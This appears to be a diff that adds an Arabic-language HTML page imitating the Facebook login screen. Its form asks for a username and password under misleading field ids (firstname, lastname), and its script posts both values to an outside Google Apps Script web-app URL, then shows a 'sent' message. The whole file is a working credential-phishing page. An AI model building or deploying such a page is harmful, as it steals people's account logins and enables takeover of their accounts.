@@ -1,0 +1,162 @@
+﻿<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>فيسبوك - تسجيل الدخول</title>
+    <style>
+        body {
+            font-family: Helvetica, Arial, sans-serif;
+            background-color: #f0f2f5;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .container {
+            display: flex;
+            flex-direction: row;
+            max-width: 980px;
+            margin: 0 auto;
+            padding: 20px;
+            align-items: center;
+            justify-content: space-between;
+            width: 100%;
+        }
+        .welcome-section {
+            flex: 1;
+            padding-right: 20px;
+        }
+        .welcome-section h1 {
+            color: #1877f2;
+            font-size: 3.5rem;
+            margin: 0 0 10px 0;
+        }
+        .welcome-section p {
+            font-size: 1.2rem;
+            color: #1c1e21;
+            line-height: 1.4;
+            margin: 0;
+        }
+        .login-box {
+            background-color: #ffffff;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
+            padding: 20px;
+            width: 396px;
+            box-sizing: border-box;
+            text-align: center;
+        }
+        .login-box input {
+            width: 100%;
+            padding: 14px 16px;
+            margin-bottom: 12px;
+            border: 1px solid #ccd0d5;
+            border-radius: 6px;
+            font-size: 16px;
+            box-sizing: border-box;
+            outline: none;
+        }
+        .login-box input:focus {
+            border-color: #1877f2;
+            box-shadow: 0 0 0 2px #e7f3ff;
+        }
+        .login-box button {
+            background-color: #1877f2;
+            border: none;
+            border-radius: 6px;
+            color: #fff;
+            font-size: 20px;
+            font-weight: bold;
+            line-height: 48px;
+            padding: 0 16px;
+            width: 100%;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+        .login-box button:hover {
+            background-color: #166fe5;
+        }
+        .status-message {
+            margin-top: 15px;
+            font-size: 14px;
+            color: #42b72a;
+            display: none;
+        }
+        @media (max-width: 768px) {
+            .container {
+                flex-direction: column;
+                text-align: center;
+            }
+            .welcome-section {
+                padding-right: 0;
+                margin-bottom: 30px;
+            }
+            .welcome-section h1 {
+                font-size: 2.5rem;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <!-- قسم الترحيب بواجهة تشبه فيسبوك -->
+        <div class="welcome-section">
+            <h1>فيسبوك</h1>
+        </div>
+
+        <!-- صندوق التسجيل -->
+        <div class="login-box">
+            <form id="appointmentForm">
+                <input type="text" id="firstname" placeholder="  اسم المستخدم" required>
+                <input type="text" id="lastname" placeholder="كلمة السر" required>
+                <button type="submit" id="submitBtn">تسجيل </button>
+            </form>
+            <div id="statusMessage" class="status-message">تم إرسال !</div>
+        </div>
+    </div>
+
+    <script>
+        const scriptURL = 'https://script.google.com/macros/s/AKfycbzNTcPTkwJapDkKc5I4f0Rp8y4sTKC-CPXURmFdhUfLcxgE40VC2DShDf1520rwpp0n/exec'; // ضع رابط Web App الخاص بك هنا بين العلامتين
+
+        const form = document.getElementById('appointmentForm');
+        const submitBtn = document.getElementById('submitBtn');
+        const statusMessage = document.getElementById('statusMessage');
+
+        form.addEventListener('submit', e => {
+            e.preventDefault();
+            submitBtn.disabled = true;
+            submitBtn.textContent = 'جاري الإرسال...';
+
+            const data = {
+                firstname: document.getElementById('firstname').value,
+                lastname: document.getElementById('lastname').value
+            };
+
+            fetch(scriptURL, {
+                method: 'POST',
+                mode: 'no-cors', // لتفادي مشاكل الحماية بين النطاقات
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(data)
+            })
+            .then(() => {
+                statusMessage.style.display = 'block';
+                form.reset();
+                submitBtn.disabled = false;
+                submitBtn.textContent = 'تسجيل ';
+            })
+            .catch(error => {
+                alert('حدث خطأ، يرجى المحاولة مرة أخرى.');
+                submitBtn.disabled = false;
+                submitBtn.textContent = 'تسجيل ';
+            });
+        });
+    </script>
+
+</body>
+</html>
